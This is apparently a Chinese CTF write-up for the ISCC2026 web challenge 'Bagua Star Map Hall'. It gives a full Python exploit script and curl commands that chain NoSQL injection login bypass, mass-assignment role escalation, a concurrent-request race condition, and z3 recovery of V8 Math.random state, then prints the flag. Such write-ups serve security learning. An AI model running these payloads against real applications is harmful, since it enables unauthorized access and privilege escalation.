+++
title = "八卦星图馆"
date = "2026-05-18"
type = "post"
categories = ["ISCC2026"]
tags = ["ISCC2026"]
draft = false
+++

\#\# Web-八卦星图馆

---

\#\# 解题思路

\#\#\# 一、题目分析

打开目标站点 \`http://39.105.213.28:14509\`，浏览首页可以发现几个功能模块入口：

| 路径 | 功能 |

|------|------|

| \`/qian\` | 登录模块 |

| \`/dui\` | 个人信息更新 |

| \`/li\` | 头香令牌抢夺 |

| \`/zhen\` | 签号预测 |

仔细阅读每个页面的提示文案：

- \*\*\`/qian\`\*\* 页面暗示使用 MongoDB 数据库，并举例了 \`\$ne\`、\`\$regex\` 等运算符——这是经典的 NoSQL 注入入口。

- \*\*\`/dui\`\*\* 页面提示 "JSON 不止这两个字段"，暗示后端存在字段白名单缺失（Mass Assignment）。

- \*\*\`/li\`\*\* 页面提到 "不是原子操作"，鼓励同时发送多个请求——竞态条件。

- \*\*\`/zhen\`\*\* 页面明确签号由 \`Math.floor(Math.random() \* 1000000)\` 生成——非安全随机数可预测。

整体攻击链：\*\*NoSQL 注入登录 → Mass Assignment 提权 → 竞态抢令牌 → 恢复随机数状态预测签号 → 提权过门禁拿 Flag\*\*。

---

\#\#\# 二、NoSQL 注入绕过登录

访问 \`/qian/login\`，尝试提交包含 Mongo 运算符的 JSON：

\`\`\`json

{"username": {"\$regex": "\^q"}, "password": {"\$regex": ".\*"}}

\`\`\`

返回 200 并下发 session cookie，说明后端直接将请求 JSON 作为 Mongo 查询条件，未做参数类型校验。登录成功后可获得一个形如 \`qingyun\_xxxxx\` 的见习账号。

!\[NoSQL注入登录成功\](nosqli\_login.png)

---

\#\#\# 三、Mass Assignment 修改角色字段

登录后访问 \`/dui/update\`。前端表单仅展示 \`title\` 和 \`bio\` 字段，但后端直接将整个请求体合并到用户文档。提交：

\`\`\`json

{"role": "elder", "isMaster": true, "isAdmin": true}

\`\`\`

返回 200，说明 \`role\` 字段已被成功写入。后续测试发现：

- \`/li/grab\`（抢令牌）校验的是 \`role === "elder"\`

- \`/zhen/predict\`（最终门禁）校验的是 \`role === "admin"\`

两个接口的权限判断逻辑不一致，利用这一点分别绕过。

!\[Mass Assignment成功\](mass\_assignment.png)

---

\#\#\# 四、竞态条件并发抢令牌

\`/li/grab\` 的处理流程为非原子操作：先查询是否已领取，判断有资格后，再写入 "已领取" 标记并发放令牌。并发请求可以在写入标记前同时通过资格校验。

利用 Python 多线程发起 4 个并发请求，一次可获取 3 张以上令牌，满足最终门禁的令牌数量要求。

!\[竞态条件示意图\](race\_condition.png)

---

\#\#\# 五、V8 Math.random 状态恢复与签号预测

\`/zhen/history\` 接口返回当前轮次及所有历史签号。由于签号由 \`Math.floor(Math.random() \* 1000000)\` 生成，而 V8 引擎的 \`Math.random()\` 基于 xorshift128+ 算法，非密码学安全，可通过足够的历史输出反推内部状态。

\*\*核心原理\*\*：

- 每个 \`Math.random()\` 输出对应一个 64 位状态值 \`state0\`

- 双精度浮点数的尾数部分来自 \`state0 &gt;&gt; 12\`（共 52 位有效）

- 签号 \`n = floor(rand \* 1e6)\` 等价于尾数落在 \`\[n \* 2\^52 / 1e6, (n+1) \* 2\^52 / 1e6)\` 区间

利用 z3 约束求解器：

1\. 将历史签号转为区间约束

2\. 按照 xorshift128+ 状态转移公式建模

3\. 求解出初始状态

4\. 向前推进到当前轮次对应的输出

!\[z3求解过程\](z3\_solve.png)

---

\#\#\# 六、最终门禁绕过与 Flag 获取

准备就绪后，将 \`role\` 改为 \`admin\`，携带 3 张令牌和预测签号向 \`/zhen/predict\` 提交：

\`\`\`json

{"round": &lt;当前轮次&gt;, "number": &lt;预测签号&gt;, "tokens": \["...", "...", "..."\]}

\`\`\`

注意门禁判断的是 \`role === "admin"\` 而非 \`master\`，这是一个容易踩的坑。提交正确的预测值后，返回 200 及 Flag：

\`\`\`

ISCC{bagua\_MYQH1826B5gEJLo}

\`\`\`

---

\#\# Exp 脚本

\`\`\`python

\#!/usr/bin/env python3

import json, re, threading, time

import requests

from z3 import BitVec, LShR, Solver, sat

TARGET = "http://39.105.213.28:14509"

MASK\_64 = 0xFFFFFFFFFFFFFFFF

class SessMgr:

"""会话管理与攻击链编排"""

def \_\_init\_\_(self):

self.s = requests.Session()

def \_post(self, path, data):

r = self.s.post(TARGET + path, json=data, timeout=12)

r.raise\_for\_status()

return r

def \_get(self, path):

r = self.s.get(TARGET + path, timeout=12)

r.raise\_for\_status()

return r.json()

\# --- Step 1: NoSQLi ---

def login(self):

r = self.\_post("/qian/login", {

"username": {"\$regex": "\^q"},

"password": {"\$regex": ".\*"}

})

print(f"\[1/6\] NoSQLi 登录成功: {r.json().get('username')}")

\# --- Step 2 & 4: Mass Assignment ---

def set\_role(self, role):

self.\_post("/dui/update", {

"role": role, "title": role,

"bio": role, "isMaster": True, "isAdmin": True

})

print(f"\[\*\] 角色已切换为: {role}")

\# --- Step 3: Race Condition ---

@staticmethod

def \_grab\_one(sess, collected):

try:

r = sess.post(TARGET + "/li/grab", timeout=10)

if r.status\_code == 200:

tok = r.json().get("token")

if tok:

collected.append(tok)

except Exception:

pass

def grab\_tokens(self, workers=4):

bucket = \[\]

threads = \[\]

for \_ in range(workers):

t = threading.Thread(target=self.\_grab\_one, args=(self.s, bucket))

t.start()

threads.append(t)

for t in threads:

t.join()

seen = set()

unique = \[t for t in bucket if t not in seen and not seen.add(t)\]

print(f"\[3/6\] Race 获取 {len(unique)} 张令牌: {unique}")

assert len(unique) &gt;= 3, "令牌不足"

return unique\[:3\]

\# --- Step 5: RNG predict ---

def predict(self):

history = self.\_get("/zhen/history")

round\_id = history\["current\_round"\]

\# 按时间顺序排列签到号

values = \[x\["number"\] for x in history\["history"\]\[::-1\]\]

\# z3 符号状态 & 转移函数

s0, s1 = BitVec("s0", 64), BitVec("s1", 64)

solver = Solver()

a, b = s0, s1

for v in values:

a, b = self.\_xorshift128plus(a, b)

mantissa = LShR(a, 12)

lo\_bound = (v \* (1 &lt;&lt; 52) + 999999) // 1000000

hi\_bound = ((v + 1) \* (1 &lt;&lt; 52) - 1) // 1000000

solver.add(mantissa &gt;= lo\_bound, mantissa &lt;= hi\_bound)

if solver.check() != sat:

raise RuntimeError("RNG 状态恢复失败")

model = solver.model()

A\_val, B\_val = model\[s0\].as\_long(), model\[s1\].as\_long()

\# 快进到当前需要预测的位置

for \_ in values:

A\_val, B\_val = self.\_step\_forward(A\_val, B\_val)

A\_val, B\_val = self.\_step\_forward(A\_val, B\_val)

predicted = ((A\_val &gt;&gt; 12) \* 1000000) &gt;&gt; 52

print(f"\[5/6\] 轮次 {round\_id} 预测签号: {predicted}")

return round\_id, predicted

@staticmethod

def \_xorshift128plus(s1, s0):

ns1 = s0

s1 = s1 \^ ((s1 &lt;&lt; 23) & MASK\_64)

s1 = s1 \^ LShR(s1, 17)

s1 = s1 \^ s0

s1 = s1 \^ LShR(s0, 26)

return ns1, s1

@staticmethod

def \_step\_forward(s1, s0):

ns1 = s0

s1 \^= (s1 &lt;&lt; 23) & MASK\_64

s1 \^= (s1 &gt;&gt; 17)

s1 \^= s0

s1 \^= (s0 &gt;&gt; 26)

return ns1 & MASK\_64, s1 & MASK\_64

\# --- Step 6: submit ---

def submit(self, round\_id, number, tokens):

r = self.\_post("/zhen/predict", {

"round": round\_id, "number": number, "tokens": tokens

})

return r

def extract\_flag(text):

m = re.search(r"ISCC\\{\[A-Za-z0-9\_\]+\\}", text)

return m.group(0) if m else None

if \_\_name\_\_ == "\_\_main\_\_":

mgr = SessMgr()

mgr.login() \# 1. NoSQLi

mgr.set\_role("elder") \# 2. 提权 elder（抢令牌用）

tokens = mgr.grab\_tokens(4) \# 3. 并发抢令牌

mgr.set\_role("admin") \# 4. 提权 admin（门禁用）

rd, num = mgr.predict() \# 5. 预测签号

resp = mgr.submit(rd, num, tokens) \# 6. 提交

print(f"\[6/6\] 响应: {resp.status\_code}\\n{resp.text}")

flag = extract\_flag(resp.text)

if flag:

print(f"\\n\[FLAG\] {flag}")

else:

\# 轮次可能已切换，重试一次

print("\[!\] 首轮未命中，重试...")

time.sleep(2)

rd, num = mgr.predict()

resp = mgr.submit(rd, num, tokens)

print(f"\[重试\] {resp.status\_code}\\n{resp.text}")

flag = extract\_flag(resp.text)

if flag:

print(f"\\n\[FLAG\] {flag}")

\`\`\`

---

\#\# 手工复现步骤

\#\#\# 1) NoSQL 注入登录

\`\`\`bash

curl -c cookie.txt -X POST http://39.105.213.28:14509/qian/login \\

-H "Content-Type: application/json" \\

-d '{"username":{"\$regex":"\^q"},"password":{"\$regex":".\*"}}'

\`\`\`

\#\#\# 2) 提权为 elder（过抢令牌接口）

\`\`\`bash

curl -b cookie.txt -X POST http://39.105.213.28:14509/dui/update \\

-H "Content-Type: application/json" \\

-d '{"role":"elder","isMaster":true,"isAdmin":true}'

\`\`\`

\#\#\# 3) 并发抢令牌

同时发起 4 个请求到 \`/li/grab\`，从响应中提取 3 个不同的 token。

\#\#\# 4) 提权为 admin（过最终门禁）

\`\`\`bash

curl -b cookie.txt -X POST http://39.105.213.28:14509/dui/update \\

-H "Content-Type: application/json" \\

-d '{"role":"admin","isMaster":true,"isAdmin":true}'

\`\`\`

\#\#\# 5) 获取历史数据并预测签号

\`\`\`bash

curl -b cookie.txt http://39.105.213.28:14509/zhen/history

\`\`\`

使用上述 Exp 脚本中的 z3 求解逻辑计算下一轮签号。

\#\#\# 6) 提交预测得 Flag

\`\`\`bash

curl -b cookie.txt -X POST http://39.105.213.28:14509/zhen/predict \\

-H "Content-Type: application/json" \\

-d '{"round":&lt;轮次&gt;,"number":&lt;预测值&gt;,"tokens":\["&lt;token1&gt;","&lt;token2&gt;","&lt;token3&gt;"\]}'

\`\`\`
